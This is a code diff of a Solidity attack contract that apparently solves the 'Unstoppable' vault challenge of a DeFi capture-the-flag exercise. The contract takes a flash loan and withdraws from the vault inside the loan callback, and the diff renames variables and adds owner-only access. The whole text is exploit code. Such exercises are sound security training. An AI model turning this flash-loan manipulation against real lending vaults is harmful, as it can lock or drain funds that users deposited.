@@ -9,11 +9,11 @@ import {IERC3156FlashBorrower, IERC3156FlashLender} from "openzeppelin/interface
 import "openzeppelin/token/ERC721/ERC721.sol";
 import "./UnstoppableVault.sol";
 
-contract UnstoppableVaultAttack is IERC3156FlashBorrower {
-    UnstoppableVault vault;
+contract UnstoppableVaultAttack is Owned, IERC3156FlashBorrower {
+    UnstoppableVault pool;
 
-    constructor(address vaultAddress) {
-        vault = UnstoppableVault(vaultAddress);
+    constructor(address vaultAddress) Owned(msg.sender) {
+        pool = UnstoppableVault(vaultAddress);
     }
 
     function onFlashLoan(
@@ -23,12 +23,14 @@ contract UnstoppableVaultAttack is IERC3156FlashBorrower {
         uint256 fee,
         bytes calldata
     ) external returns (bytes32) {
-        ERC20(token).approve(address(vault), amount);
-        vault.withdraw(1, address(this), address(this));
+        ERC20(token).approve(address(pool), amount);
+
+        pool.withdraw(1, address(this), address(this));
+
         return keccak256("IERC3156FlashBorrower.onFlashLoan");
     }
 
-    function attack(uint256 value) external {
-        vault.flashLoan(this, address(vault.asset()), value, bytes(""));
+    function executeFlashLoan(uint256 value) external onlyOwner {
+        pool.flashLoan(this, address(pool.asset()), value, bytes(""));
     }
 }
